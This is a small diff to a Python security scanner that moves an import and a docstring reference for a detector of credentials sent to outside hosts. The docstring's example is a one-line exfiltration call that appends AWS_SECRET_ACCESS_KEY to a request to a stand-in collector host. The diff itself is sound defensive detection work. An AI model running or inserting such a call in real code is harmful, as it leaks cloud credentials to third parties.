@@ -2354,10 +2354,10 @@ class PythonAnalyzer:
         """One named credential, in a request to a host outside the credential's home.
 
         `urlopen("https://collector.example/?k=" + os.environ["AWS_SECRET_ACCESS_KEY"])`, or the
-        value through a variable, or the URL through one. See `detect/secretflow.py` for what a
+        value through a variable, or the URL through one. See `analysis/shared/credential_homes.py` for what a
         home is and why a host the file does not write down is never judged.
         """
-        from cordon_scanner.detect.code.secretflow import SecretFlow
+        from cordon_scanner.analysis.shared.credential_homes import SecretFlow
 
         def credential_read(node: ast.AST) -> str | None:
             name: ast.AST | None = None
